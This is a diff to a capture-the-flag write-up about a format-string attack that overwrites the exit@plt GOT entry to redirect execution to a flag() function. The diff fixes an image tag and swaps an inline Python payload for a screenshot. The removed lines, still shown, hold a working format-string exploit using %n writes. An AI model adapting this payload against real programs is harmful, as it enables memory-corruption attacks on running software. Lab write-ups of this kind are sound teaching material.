@@ -30,7 +30,7 @@ Disassembling main in GDB, we see the final instruction is "exit@plt", and disas
 Let's try to simulate changing the address of the GOT to the flag() address in GDB.
 We set a breakpoint in our program right at the call to printf and another breakpoint at the exit@plt call, and then run the program. Once it hits the first breakpoint we are going to set the GOT to our new address, and then confirm it by examining the address. 
 
-<img src=https://github.com/Keramas/CTF-Writeups/blob/master/Images/baby0x41414141/breakpoints.png">
+<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/baby0x41414141/breakpoints.png">
 <img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/baby0x41414141/gotoverwritetest.png">
 
 Now that it's changed, let's continue running our program. Once it hits the call to exit@plt it should be redirected to our flag() function. 
@@ -45,22 +45,7 @@ There is a great video about this process by <a href="https://www.youtube.com/wa
 
 I whipped up the following exploit with Python:
 
-<code>
-import struct
-
-flag = 0x804870b
-exit = 0x804a034
-
-payload = ""
-payload += struct.pack("I", exit)
-payload += struct.pack("I", exit+2)
-payload += "%10$34492x "	
-payload += "%10$n"
-payload += "%33016x "
-payload += "%11$n"
-
-print payload
-</code>
+<img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/baby0x41414141/pythonexploit.png">
 
 After exporting this into a file, we are ready to deliver the payload to our challenge.
 
